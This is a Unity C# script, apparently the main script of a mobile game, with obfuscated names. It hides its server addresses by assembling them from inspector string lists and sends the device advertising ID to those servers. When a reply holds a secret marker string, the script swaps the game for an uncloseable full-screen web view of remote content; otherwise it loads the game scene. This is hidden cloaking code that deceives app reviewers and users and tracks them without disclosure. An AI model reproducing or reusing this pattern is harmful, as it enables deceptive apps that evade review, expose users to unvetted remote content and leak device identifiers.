
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using System;
using System.Collections;
using System.Collections.Generic;

public class MainNOSV : MonoBehaviour
{
    public List<string> splitters;
    public List<string> splitters1;
    public List<string> splitters2;
    [HideInInspector] public string oNOSVname = "";
    [HideInInspector] public string tNOSVname = "";
    [HideInInspector] public string tNOSVname1 = "";
    [HideInInspector] public string tNOSVname2 = "";

    private Dictionary<string, object> exubNOSVs;
    private bool? _isexNOSV;
    private string _exNOSV;

    private bool NOSVLo = false;
    private bool NOSVLo2 = false;

    [SerializeField] private GameObject _NOSVbscr;
    [SerializeField] private RectTransform _NOSVprt;

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaNOSV") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oNOSVname = advertisingId; });
        }
    }

    private void LATTICENOSVSPOT(string GuideNOSVplead, string NamingNOSV = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);

        var _bridgesNOSV = gameObject.AddComponent<UniWebView>();
        _bridgesNOSV.ReferenceRectTransform = _NOSVprt;
        _bridgesNOSV.EmbeddedToolbar.SetDoneButtonText("");

        switch (NamingNOSV)
        {
            case "0":
                _bridgesNOSV.EmbeddedToolbar.Show();
                break;

            default:
                _bridgesNOSV.EmbeddedToolbar.Hide();
                break;
        }

        _bridgesNOSV.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);

        _bridgesNOSV.OnShouldClose += (view) =>
        {
            return false;
        };

        _bridgesNOSV.SetSupportMultipleWindows(true, true);
        _bridgesNOSV.SetAllowBackForwardNavigationGestures(true);

        _bridgesNOSV.OnMultipleWindowOpened += (view, windowId) =>
        {
            _bridgesNOSV.EmbeddedToolbar.Show();

        };

        _bridgesNOSV.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingNOSV)
            {
                case "0":
                    _bridgesNOSV.EmbeddedToolbar.Show();
                    break;

                default:
                    _bridgesNOSV.EmbeddedToolbar.Hide();
                    break;
            }
        };

        _bridgesNOSV.OnOrientationChanged += (view, orientation) =>
        {
            _bridgesNOSV.Frame = _NOSVprt.rect;
        };

        _bridgesNOSV.OnPageFinished += (view, statusCode, url) =>
        {
            if (NOSVLo2 == false)
            {
                NOSVLo2 = true;

                _NOSVbscr.SetActive(true);

                _bridgesNOSV.Show(true, UniWebViewTransitionEdge.Bottom, 0.4f);
            }

            if (PlayerPrefs.GetString("GuideNOSVplead", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("GuideNOSVplead", url);
            }
        };

        _bridgesNOSV.Load(GuideNOSVplead);
    }



    private void FirstTimeNOSVOpen()
    {
        if (PlayerPrefs.GetInt("FirstTimeOpening?", 1) == 1)
        {
            PlayerPrefs.SetInt("FirstTimeOpening", 0);

            string fullInstallNOSVEventEndpoint = tNOSVname2 + string.Format("?advertiser_tracking_id={0}", oNOSVname);

            StartCoroutine(NOSVSECGE(fullInstallNOSVEventEndpoint));
        }
    }

    private IEnumerator CANTNOSVOP(int tioc)
    {
        yield return new WaitForSeconds(tioc);

        if (NOSVLo)
            yield break;

        else
            STARTIENUMENATORNOSV(false);

        yield break;
    }



    private void STARTIENUMENATORNOSV(bool isexNOSV) => StartCoroutine(IENUMENATORNOSV(isexNOSV));



    private void GoNOSV()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("SampleScene");
    }

    private IEnumerator NOSVSECGE(string liNOSV)
    {
        using (UnityWebRequest request = UnityWebRequest.Get(liNOSV))
        {
            yield return request.SendWebRequest();

            try
            {
                if (request.result == UnityWebRequest.Result.Success)
                {
                    _exNOSV = request.downloadHandler.text.Replace("\"", "");

                    PlayerPrefs.SetString("Link", _exNOSV);
                }

                else if (request.result == UnityWebRequest.Result.ProtocolError || request.result == UnityWebRequest.Result.ConnectionError)
                {
                    throw new Exception("Error");
                }

                exubNOSVs = TRANSFORMNOSVTREAT(new Uri(_exNOSV).Query);

                if (exubNOSVs == new Dictionary<string, object>())
                {
                    _isexNOSV = false;

                    STARTIENUMENATORNOSV(_isexNOSV.Value);
                }

                else
                {
                    _isexNOSV = true;

                    STARTIENUMENATORNOSV(_isexNOSV.Value);
                }
            }

            catch (Exception e)
            {
                Debug.Log(e.ToString());

                STARTIENUMENATORNOSV(false);
            }
        }
    }

    private Dictionary<string, object> TRANSFORMNOSVTREAT(string NOSVqueue)
    {
        Dictionary<string, object> result = new Dictionary<string, object>();

        try
        {
            string processedNOSVqueue = NOSVqueue.Remove(0, 1);
            string[] pairs = processedNOSVqueue.Split('&');

            foreach (string pair in pairs)
            {
                string[] splittedNOSVqueuPair = pair.Split("=");

                result.Add(splittedNOSVqueuPair[0], splittedNOSVqueuPair[1]);                
            }
        }

        catch
        {
            return new Dictionary<string, object>();
        }

        return result;
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            StartCoroutine(CANTNOSVOP(10));

            foreach (string n in splitters)
                tNOSVname += n;

            foreach (string n in splitters1)
                tNOSVname1 += n;

            foreach (string n in splitters2)
                tNOSVname2 += n;

            StartCoroutine(NOSVSECGE(tNOSVname1 + string.Format("?advertiser_tracking_id={0}", oNOSVname)));

            FirstTimeNOSVOpen();
        }

        else
            GoNOSV();
    }

    private IEnumerator IENUMENATORNOSV(bool isexNOSV)
    {
        using (UnityWebRequest nosv = UnityWebRequest.Get(tNOSVname))
        {
            yield return nosv.SendWebRequest();            

            if (nosv.result == UnityWebRequest.Result.ProtocolError || nosv.result == UnityWebRequest.Result.ConnectionError)
            {
                GoNOSV();
            }

            if (!isexNOSV && PlayerPrefs.GetString("GuideNOSVplead", string.Empty) != string.Empty)
            {
                LATTICENOSVSPOT(PlayerPrefs.GetString("GuideNOSVplead"));                

                NOSVLo = true;

                yield return null;
            }

            int draftNOSV = 7;

            while (PlayerPrefs.GetString("glrobo", "") == "" && draftNOSV > 0)
            {
                yield return new WaitForSeconds(1);
                draftNOSV--;
            }

            try
            {
                if (nosv.result == UnityWebRequest.Result.Success)
                {
                    if (nosv.downloadHandler.text.Contains("NldssSvVgrJswed"))
                    {                        
                        switch (isexNOSV)
                        {
                            case true:
                                string NOSVfin = nosv.downloadHandler.text.Replace("\"", "");

                                NOSVfin += "/?";

                                try
                                {
                                    foreach (KeyValuePair<string, object> entry in exubNOSVs)
                                    {
                                        NOSVfin += entry.Key + "=" + entry.Value + "&";
                                    }

                                    NOSVfin = NOSVfin.Remove(NOSVfin.Length - 1);

                                    LATTICENOSVSPOT(NOSVfin);

                                    NOSVLo = true;
                                }

                                catch
                                {
                                    goto case false;
                                }                                

                                break;

                            case false:
                                try
                                {
                                    var subscs = nosv.downloadHandler.text.Split('|');
                                    NOSVfin = subscs[0] + "?idfa=" + oNOSVname;

                                    PlayerPrefs.SetString("GuideNOSVplead", NOSVfin);

                                    LATTICENOSVSPOT(NOSVfin, subscs[1]);

                                    NOSVLo = true;
                                }

                                catch
                                {
                                    NOSVfin = nosv.downloadHandler.text + "?idfa=" + oNOSVname;

                                    PlayerPrefs.SetString("GuideNOSVplead", NOSVfin);

                                    LATTICENOSVSPOT(NOSVfin);

                                    NOSVLo = true;
                                }

                                break;
                        }
                    }

                    else
                    {
                        GoNOSV();
                    }
                }

                else
                {
                    GoNOSV();                   
                }
            }

            catch
            {
                GoNOSV();
            }
        }
    }
}